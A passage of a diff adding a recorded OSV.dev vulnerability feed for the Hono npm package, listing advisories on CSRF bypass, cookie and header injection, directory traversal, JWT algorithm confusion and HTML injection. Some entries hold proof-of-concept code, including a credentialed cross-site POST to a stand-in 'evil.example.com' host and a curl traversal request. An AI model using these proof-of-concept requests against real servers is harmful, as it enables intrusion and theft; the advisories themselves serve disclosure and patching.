@@ -1,0 +1,3698 @@
+{
+ "source": "https://api.osv.dev",
+ "recorded": "2026-10-28",
+ "queries": {
+  "npm:hono": [
+   {
+    "id": "GHSA-2234-fmw7-43wr",
+    "summary": "Hono allows bypass of CSRF Middleware by a request without Content-Type header.",
+    "details": "### Summary\nBypass CSRF Middleware by a request without Content-Type herader.\n\n### Details\nAlthough the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.\n\nhttps://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89\n\n### PoC\n```server.js\n// server.js\nimport { Hono } from 'hono'\nimport { csrf }from 'hono/csrf'\nconst app = new Hono()\napp.use(csrf())\napp.get('/', (c) => {\n  return c.html('Hello Hono!')\n})\napp.post('/', async (c) => {\n  console.log(\"executed\")\n  return c.text( await c.req.text())\n})\nDeno.serve(app.fetch)\n```\n\n```poc.html\n<!-- PoC.html -->\n<script>\nasync function myclick() {\n    await fetch(\"http://evil.example.com\", {\n    method: \"POST\",\n    credentials: \"include\",\n    body:new Blob([`test`],{}),\n    });\n}\n</script>\n<input type=\"button\" onclick=\"myclick()\" value=\"run\" />\n```\n\nSimilarly, the fetch API does not add a Content-Type header for requests that do not include a Body.\n```PoC2.js\nawait fetch(\"http://localhost:8000\", { method: \"POST\", credentials: \"include\"});\n```\n\n### Impact\nBypass csrf protection implemented with hono csrf middleware.\n",
+    "aliases": [
+     "CVE-2024-48913"
+    ],
+    "modified": "2026-09-10T03:50:19.035733420Z",
+    "published": "2024-10-15T17:43:50Z",
+    "database_specific": {
+     "github_reviewed_at": "2024-10-15T17:43:50Z",
+     "nvd_published_at": "2024-10-15T16:15:05Z",
+     "cwe_ids": [
+      "CWE-352"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48913"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/aa50e0ab77b5af8c53c50fe3b271892f8eeeea82"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.6.5"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-2234-fmw7-43wr/GHSA-2234-fmw7-43wr.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-26pp-8wgv-hjvm",
+    "summary": "Hono missing validation of cookie name on write path in setCookie()",
+    "details": "## Summary\n\nCookie names are not validated on the write path when using `setCookie()`, `serialize()`, or `serializeSigned()` to generate Set-Cookie headers.\n\nWhile certain cookie attributes such as domain and path are validated, the cookie name itself may contain invalid characters.\n\nThis results in inconsistent handling of cookie names between parsing (read path) and serialization (write path).\n\n## Details\n\nWhen applications use `setCookie()`, `serialize()`, or `serializeSigned()` with a user-controlled cookie name, invalid values (e.g., containing control characters such as `\\r` or `\\n`) can be used to construct malformed `Set-Cookie` header values.\n\nFor example:\n\n```\nSet-Cookie: legit\nX-Injected: evil=value\n```\n\nHowever, in modern runtimes such as Node.js and Cloudflare Workers, such invalid header values are rejected and result in a runtime error before the response is sent.\n\nAs a result, the reported header injection / response splitting behavior could not be reproduced in these environments.\n\n## Impact\n\nApplications that pass untrusted input as the cookie name to `setCookie()`, `serialize()`, or `serializeSigned()` may encounter runtime errors due to invalid header values.\n\nIn tested environments, malformed `Set-Cookie` headers are rejected before being sent, and the reported header injection behavior could not be reproduced.\n\nThis issue primarily affects correctness and robustness rather than introducing a confirmed exploitable vulnerability.",
+    "aliases": [
+     "CVE-2026-56762"
+    ],
+    "modified": "2026-09-24T18:45:10.903668809Z",
+    "published": "2026-04-08T00:17:02Z",
+    "database_specific": {
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-113",
+      "CWE-20"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-04-08T00:17:02Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-26pp-8wgv-hjvm"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-56762"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/a586cd72e3f6122792e631ecf1817e5cabb803ec"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.12"
+     },
+     {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/hono-missing-cookie-name-validation-in-setcookie"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.12"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-26pp-8wgv-hjvm/GHSA-26pp-8wgv-hjvm.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-2gcr-mfcq-wcc3",
+    "summary": "Hono: app.mount() strips mount prefix using undecoded path, causing incorrect routing for percent-encoded paths",
+    "details": "### Summary\n\n`app.mount()` strips the mount prefix from the incoming request path using the raw URL pathname, while route matching is performed against the percent-decoded path. This inconsistency causes the prefix to be stripped at the wrong position when the path contains percent-encoded multi-byte characters, resulting in the mounted sub-application receiving an incorrect path.\n\n### Details\n\nWhen `app.mount(prefix, subApp)` is called, Hono calculates the number of characters to strip based on the decoded mount prefix length, but then applies that slice to the raw URL pathname. When the URL contains percent-encoded characters that expand to fewer characters when decoded (such as encoded non-ASCII characters), the two representations have different lengths, so the prefix is stripped at the wrong byte offset.\n\nAs a result, the sub-application receives a path that does not correspond to the intended sub-path \u2014 it may receive a partial or garbled path instead of the expected value after the mount prefix is removed.\n\nThis issue arises when an application uses `app.mount()` with paths that contain percent-encoded characters, particularly when the mount prefix itself or the request path contains encoded non-ASCII characters.\n\n### Impact\n\nA mounted sub-application may receive an incorrectly stripped path, causing requests to be routed to unintended handlers within the sub-application.\n\nThis may lead to:\n\n- Middleware or route handlers in the sub-application being bypassed or incorrectly matched due to the malformed path\n- Requests reaching sub-application routes that the developer did not intend to be accessible via the mounted path\n\nThis issue affects applications that use `app.mount()` where the request URL may contain percent-encoded characters in the mount prefix or subsequent path segments.",
+    "aliases": [
+     "CVE-2026-47676"
+    ],
+    "modified": "2026-09-10T03:51:07.554753223Z",
+    "published": "2026-06-04T18:01:00Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-06-04T18:01:00Z",
+     "nvd_published_at": "2026-05-28T17:16:32Z",
+     "cwe_ids": [
+      "CWE-444",
+      "CWE-693"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-2gcr-mfcq-wcc3"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-47676"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/6cbb025ff87fca1a3d00d0ccca0eaf3a6385c3f1"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.21"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.21"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-2gcr-mfcq-wcc3/GHSA-2gcr-mfcq-wcc3.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-3hrh-pfw6-9m5x",
+    "summary": "Hono: Cookie helper does not sanitize sameSite and priority, allowing Set-Cookie injection",
+    "details": "### Summary\n\nThe `serialize()` function in `hono/cookie` validates `domain` and `path` options against characters that corrupt `Set-Cookie` header syntax (`;`, `\\r`, `\\n`), but does not apply the same validation to `sameSite` and `priority`. An application that passes user-controlled input into either option may produce a `Set-Cookie` response header containing attacker-chosen additional attributes.\n\n### Details\n\nWhen constructing a `Set-Cookie` header value, `serialize()` appends the `sameSite` and `priority` option values directly into the output string after a presentation-only transformation (capitalizing the first character). Although the TypeScript type signature constrains these options to specific string literals, that constraint is not enforced at runtime; any string value, including one containing `;` or line-feed characters, passes through unchanged.\n\nThe validation guard that rejects `;`, `\\r`, and `\\n` from `domain` and `path` is not applied to `sameSite` or `priority`. An application that passes a request-derived value to either option therefore provides an injection point into the header line.\n\nThis issue arises when an application passes user-controlled input to the `sameSite` or `priority` option of `setCookie()` or `serialize()`.\n\n### Impact\n\nAn attacker who can control the `sameSite` or `priority` option value may inject additional attributes into a `Set-Cookie` response header.\n\nThis may lead to:\n\n- Cookie attribute injection \u2014 overriding `Domain`, `Path`, `HttpOnly`, `Secure`, or `Max-Age` for the affected cookie\n- HTTP response header injection on runtimes that do not strictly validate header values, enabling a second attacker-controlled `Set-Cookie` header in the same response\n\nThis issue affects applications that pass user-derived input into the `sameSite` or `priority` option of `hono/cookie` serialization functions.",
+    "aliases": [
+     "CVE-2026-47675"
+    ],
+    "modified": "2026-09-10T03:50:55.293982711Z",
+    "published": "2026-06-04T17:59:25Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-06-04T17:59:25Z",
+     "nvd_published_at": "2026-05-28T17:16:32Z",
+     "cwe_ids": [
+      "CWE-113",
+      "CWE-1287"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-3hrh-pfw6-9m5x"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-47675"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/905aedbc20661e0e2fa378783a7ec44a5c3df43d"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.21"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.21"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-3hrh-pfw6-9m5x/GHSA-3hrh-pfw6-9m5x.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-3mpf-rcc7-5347",
+    "summary": "Hono vulnerable to Restricted Directory Traversal in serveStatic with deno",
+    "details": "### Summary\n\nWhen using serveStatic with deno, it is possible to directory traverse where main.ts is located.\n\nMy environment is configured as per this tutorial\nhttps://hono.dev/getting-started/deno\n\n### PoC\n\n```bash\n$ tree\n.\n\u251c\u2500\u2500 deno.json\n\u251c\u2500\u2500 deno.lock\n\u251c\u2500\u2500 main.ts\n\u251c\u2500\u2500 README.md\n\u2514\u2500\u2500 static\n    \u2514\u2500\u2500 a.txt\n```\n\nsource\n\n```jsx\nimport { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'\nimport { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'\n\nconst app = new Hono()\napp.use('/static/*', serveStatic({ root: './' }))\n\nDeno.serve(app.fetch)\n```\n\nrequest\n\n```bash\ncurl localhost:8000/static/%2e%2e/main.ts\n```\n\nresponse is content of main.ts\n\n### Impact\n\nUnexpected files are retrieved.",
+    "aliases": [
+     "CVE-2024-32869"
+    ],
+    "modified": "2026-09-10T03:50:11.100696440Z",
+    "published": "2024-04-23T16:20:49Z",
+    "database_specific": {
+     "github_reviewed": true,
+     "github_reviewed_at": "2024-04-23T16:20:49Z",
+     "nvd_published_at": "2024-04-23T21:15:48Z",
+     "cwe_ids": [
+      "CWE-22"
+     ],
+     "severity": "MODERATE"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32869"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.2.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-3mpf-rcc7-5347/GHSA-3mpf-rcc7-5347.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-3vhc-576x-3qv4",
+    "summary": "Hono JWK Auth Middleware has JWT algorithm confusion when JWK lacks \"alg\" (untrusted header.alg fallback)",
+    "details": "## Summary\n\nA flaw in Hono\u2019s JWK/JWKS JWT verification middleware allowed the algorithm specified in the JWT header to influence signature verification when the selected JWK did not explicitly define an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted.\n\n## Details\n\nWhen verifying JWTs using JWKs or a JWKS endpoint, the middleware selected the verification algorithm based on the JWK\u2019s `alg` field if present. If the JWK did not specify an algorithm, the middleware fell back to using the `alg` value provided in the unverified JWT header.\n\nBecause the `alg` field in a JWK is optional and commonly omitted in real-world JWKS configurations, this behavior could allow an attacker to influence which algorithm is used for verification. In some environments, this may result in authentication or authorization bypass through crafted JWTs.\n\nThe practical impact depends on application configuration, including which algorithms are accepted and how JWTs are used to make authorization decisions.\n\n## Impact\n\nIn affected configurations, an attacker may be able to forge JWTs with attacker-controlled claims, potentially leading to authentication or authorization bypass.\n\nApplications that do not use the JWK/JWKS middleware, do not rely on JWT-based authentication, or explicitly restrict allowed algorithms are not affected.\n\n## Resolution\n\nUpdate to the latest patched release.\n\n**Breaking change:**\n\nThe JWK/JWKS JWT verification middleware has been updated to require an explicit allowlist of asymmetric algorithms when verifying tokens. The middleware no longer derives the verification algorithm from untrusted JWT header values.\n\nInstead, callers must explicitly specify which asymmetric algorithms are permitted, and only tokens signed with those algorithms will be accepted. This prevents JWT algorithm confusion by ensuring that algorithm selection is fully controlled by application\nconfiguration.\n\nAs part of this fix, the `alg` option is now required when using the JWK/JWKS middleware, and symmetric (HS*) algorithms are no longer accepted in this context.\n\n### Before (vulnerable configuration)\n\n```ts\nimport { jwk } from 'hono/jwk'\n\napp.use(\n  '/auth/*',\n  jwk({\n    jwks_uri: 'https://example.com/.well-known/jwks.json',\n    // alg was optional\n  })\n)\n```\n\n### After (patched configuration)\n\n```ts\nimport { jwk } from 'hono/jwk'\n\napp.use(\n  '/auth/*',\n  jwk({\n    jwks_uri: 'https://example.com/.well-known/jwks.json',\n    alg: ['RS256'], // required: explicit asymmetric algorithm allowlist\n  })\n)\n```",
+    "aliases": [
+     "CVE-2026-22818"
+    ],
+    "modified": "2026-09-10T03:50:58.878082865Z",
+    "published": "2026-01-13T21:52:03Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-347"
+     ],
+     "severity": "HIGH",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-01-13T21:52:03Z",
+     "nvd_published_at": "2026-01-13T20:16:11Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-3vhc-576x-3qv4"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22818"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/190f6e28e2ca85ce3d1f2f54db1310f5f3eab134"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.11.4"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-3vhc-576x-3qv4/GHSA-3vhc-576x-3qv4.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-458j-xx4x-4375",
+    "summary": "hono Improperly Handles JSX Attribute Names Allows HTML Injection in hono/jsx SSR",
+    "details": "## Summary\n\nImproper handling of JSX attribute names in hono/jsx allows malformed attribute keys to corrupt the generated HTML output.\n\nWhen untrusted input is used as attribute keys during server-side rendering, specially crafted keys can break out of attribute or tag boundaries and inject unintended HTML.\n\n## Details\n\nWhen rendering JSX elements to HTML strings, attribute values are escaped, but attribute names (keys) were previously inserted into the output without validation.\n\nIf an attribute name contains characters such as `\"`, `>`, or whitespace, it can alter the structure of the generated HTML.\n\nFor example, malformed attribute names can:\n\n* Break out of the current attribute and introduce unintended additional attributes\n* Break out of the current HTML tag and inject new elements into the output\n\nThis issue arises when untrusted input (such as query parameters or form data) is used as JSX attribute keys during server-side rendering.\n\n## Impact\n\nAn attacker who can control attribute keys used in JSX rendering may inject unintended attributes or HTML elements into the generated output.\n\nThis may lead to:\n\n* Injection of unexpected HTML attributes\n* Corruption of the HTML structure\n* Potential cross-site scripting (XSS) if combined with unsafe usage patterns\n\nThis issue affects applications that pass untrusted input as JSX attribute keys during server-side rendering.",
+    "aliases": [
+     "CVE-2026-56761"
+    ],
+    "modified": "2026-09-10T03:50:42.733990619Z",
+    "published": "2026-04-16T01:02:24Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-04-16T01:02:24Z",
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-79"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-458j-xx4x-4375"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.14"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-458j-xx4x-4375/GHSA-458j-xx4x-4375.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-54fx-42gc-7vw4",
+    "summary": "Hono: Algorithmic Complexity DoS in Language Middleware",
+    "details": "### Summary\n\nThe `languageDetector` middleware is vulnerable to algorithmic complexity denial of service when processing a crafted language tag containing a large number of hyphen-separated subtags.\n\n### Details\n\nTo implement progressive language-tag truncation, `normalizeLanguage()` repeatedly calls `parts.slice(0, i).join('-')` for every possible prefix. The total amount of string processing grows quadratically with the number of subtags.\n\nLanguage values may come from a query parameter, cookie, `Accept-Language` header, or URL path, depending on the detector configuration. The default detector order enables query-string, cookie, and header detection, so applications using `languageDetector()` may expose this processing to unauthenticated requests.\n\nRequest-size limits reduce the maximum cost of a single request but do not eliminate the issue. Inputs accepted by common JavaScript runtimes can still cause noticeable synchronous event-loop blocking.\n\n### Impact\n\nAn attacker may repeatedly send requests containing long, hyphen-separated language tags, causing excessive CPU consumption and preventing unrelated requests from being processed.\n\nThe practical impact depends on the runtime's request-size limits, reverse-proxy configuration, and the detectors enabled by the application.\n\n### Resolution\n\nThe progressive lookup should avoid reconstructing every shorter prefix. The implementation can instead inspect the configured supported languages and select the longest value that matches the input at a hyphen boundary.",
+    "aliases": [
+     "CVE-2026-71848"
+    ],
+    "modified": "2026-09-10T03:50:53.311438629Z",
+    "published": "2026-08-07T18:36:31Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-08-07T18:36:31Z",
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-407"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-54fx-42gc-7vw4"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/f70e2c31684387b3231cc38512a31df6ca76a1c7"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.12.0"
+         },
+         {
+          "fixed": "4.12.34"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-54fx-42gc-7vw4/GHSA-54fx-42gc-7vw4.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-5pq2-9x2x-5p6w",
+    "summary": "Hono Vulnerable to Cookie Attribute Injection via Unsanitized domain and path in setCookie()",
+    "details": "## Summary\n\nThe `setCookie()` utility did not validate semicolons (`;`), carriage returns (`\\r`), or newline characters (`\\n`) in the `domain` and `path` options when constructing the `Set-Cookie` header.\n\nBecause cookie attributes are delimited by semicolons, this could allow injection of additional cookie attributes if untrusted input was passed into these fields.\n\n## Details\n\n`setCookie()` builds the `Set-Cookie` header by concatenating option values. While the cookie value itself is URL-encoded, the `domain` and `path` options were previously interpolated without rejecting unsafe characters.\n\nIncluding `;`, `\\r`, or `\\n` in these fields could result in unintended additional attributes (such as `SameSite`, `Secure`, `Domain`, or `Path`) being appended to the cookie header.\n\nModern runtimes prevent full header injection via CRLF, so this issue is limited to attribute-level manipulation within a single `Set-Cookie` header.\n\nThe issue has been fixed by rejecting these characters in the `domain` and `path` options.\n\n## Impact\n\nAn attacker may be able to manipulate cookie attributes if an application passes user-controlled input directly into the `domain` or `path` options of `setCookie()`.\n\nThis could affect cookie scoping or security attributes depending on browser behavior. Exploitation requires application-level misuse of cookie options.",
+    "aliases": [
+     "CVE-2026-29086"
+    ],
+    "modified": "2026-09-10T03:50:37.686721963Z",
+    "published": "2026-03-04T19:49:14Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-1113",
+      "CWE-113"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-03-04T19:49:14Z",
+     "nvd_published_at": "2026-03-04T23:16:10Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-5pq2-9x2x-5p6w"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-29086"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/44ae0c8cc4d5ab2bed529127a4ac72e1483ad073"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.4"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-5pq2-9x2x-5p6w/GHSA-5pq2-9x2x-5p6w.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-5r4p-p66f-jhc7",
+    "summary": "Hono: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths",
+    "details": "### Summary\n\n`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.\n\n### Details\n\nHono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.\n\n### Impact\n\nAn unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.",
+    "aliases": [
+     "CVE-2026-109955",
+     "CVE-2026-111757"
+    ],
+    "modified": "2026-10-20T14:45:03.780823695Z",
+    "published": "2026-10-20T14:36:11Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-174"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-10-20T14:36:11Z",
+     "nvd_published_at": "2026-10-19T18:17:00Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-5r4p-p66f-jhc7"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-111757"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/8b05c774ef1555c70f5ba5e2991b7e77cc3635cc"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.13.11"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.12.4"
+         },
+         {
+          "fixed": "4.13.11"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-5r4p-p66f-jhc7/GHSA-5r4p-p66f-jhc7.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-69xw-7hcm-h432",
+    "summary": "hono/jsx has Unvalidated JSX Tag Names that May Allow HTML Injection",
